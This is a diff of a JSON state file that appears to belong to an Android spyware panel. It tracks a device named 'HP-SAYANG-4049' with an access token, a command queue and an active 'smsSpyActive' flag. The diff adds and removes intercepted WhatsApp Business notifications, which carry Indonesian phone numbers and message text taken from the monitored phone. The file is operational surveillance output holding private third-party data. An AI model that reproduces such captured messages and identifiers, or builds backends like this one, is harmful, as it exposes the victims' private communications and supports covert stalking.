@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632729163,
+    "lastSeen": 1775632738258,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "mana elahhh",
+        "time": "08/04 14:18",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632740495
+      },
+      {
+        "appName": "WA Business",
+        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
+        "content": "‎2 pesan baru",
+        "time": "08/04 14:18",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632731557
+      },
       {
         "appName": "WA Business",
         "sender": "‎𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏 (2 pesan): Menyebut Anda",
@@ -4310,22 +4326,6 @@
         "time": "08/04 13:50",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775631026273
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": "‎3 pesan baru",
-        "time": "08/04 13:50",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631002133
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": "V5",
-        "time": "08/04 13:50",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631001982
       }
     ],
     "galleryPhotos": [],
